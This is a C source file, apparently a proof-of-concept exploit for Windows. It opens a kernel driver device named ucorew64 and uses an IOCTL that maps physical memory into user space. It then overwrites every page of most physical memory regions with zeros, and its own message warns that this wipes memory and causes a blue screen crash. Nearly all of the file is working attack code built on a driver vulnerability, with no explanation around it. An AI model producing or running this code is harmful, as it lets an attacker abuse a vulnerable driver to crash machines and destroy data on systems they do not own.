#pragma comment(lib, "ntdll.lib") // link "ntdll.lib" for NtQuerySystemInformation()
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>

#include "rw_primitive.h"
#include "windows_helper_functions.h"


int main(char argc, char** argv)
{
	HANDLE device = INVALID_HANDLE_VALUE;
	NTSTATUS status = FALSE;

	DWORD bytesReturned = 0;
	int memRegionsCount = -1;

	memRegionsCount = GetPhysicalMemoryLayout(NULL);
	if (memRegionsCount == -1) {
		fprintf(stderr, "[!] GetPhysicalMemoryLayout() failed.\n");
		return -1;
	}
	MEMORY_REGION* memRegion = (MEMORY_REGION*)calloc(memRegionsCount, sizeof(MEMORY_REGION));
	if (memRegion == NULL) {
		fprintf(stderr, "[!] calloc() failed.\n");
		return -1;
	}
	memRegionsCount = GetPhysicalMemoryLayout(memRegion);
	if (memRegionsCount == -1) {
		fprintf(stderr, "[!] GetPhysicalMemoryLayout() failed.\n");
		return -1;
	}
	
	printf("physical memory regions\n");
	for (int i = 0; i < memRegionsCount; i++) {
		printf("%p - %p\n", (void*)memRegion[i].address, (void*)(memRegion[i].address + memRegion[i].size));
	}

	device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

	if (device == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "> Could not open device: 0x%X\n", GetLastError());
		return FALSE;
	}
	HANDLE hPhysicalMemory = (HANDLE)calloc(1, sizeof(HANDLE));
	if (hPhysicalMemory == NULL) {
		fprintf(stderr, "calloc() failed");
		return FALSE;
	}
	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, hPhysicalMemory, sizeof(hPhysicalMemory), 
		hPhysicalMemory, sizeof(hPhysicalMemory), &bytesReturned, (LPOVERLAPPED)NULL);
	if (status == FALSE) {
		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %X\n", status);
		return EXIT_FAILURE;
	}
	printf("[+] Called IOCTL_MapPhysicalMemoryToLinearSpace successfully. 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	printf("Handle for PhysicalMemory: 0x%p\n", hPhysicalMemory);
	
	PVOID* buf = (PVOID*)malloc(0x1000);
	if (buf == 0) {
		exit(EXIT_FAILURE);
	}
	
	printf("THIS WILL DELETE EVERYTHING IN PHYSICAL MEMORY!!! CAUSING A BSOD!!!!\n");
	system("pause");
	for (int i = 3; i < memRegionsCount; i++) {
		unsigned __int64 start = memRegion[i].address;
		unsigned __int64 end = memRegion[i].address + memRegion[i].size;
		printf("%p - %p\n", (void*)start, (void*)end);

		for (__int64 page = start; page < end; page = page + 0x1000) {
			if (MapPhysicalMemory((HANDLE) *(PDWORD64)hPhysicalMemory, page, 0x1000, buf) == FALSE) {
				fprintf(stderr, "[!] MapPhysicalMemory failed");
				return EXIT_FAILURE;
			}
			memset(*buf, 0, 0x1000);
			if (UnmapPhysicalMemory(buf) == FALSE) {
				printf("UnmapPhysicalMemory failed");
				return EXIT_FAILURE;
			}
		}
	}

	free(buf);
	CloseHandle((HANDLE)*(PDWORD64)hPhysicalMemory);
	CloseHandle(device);
	return EXIT_SUCCESS;

}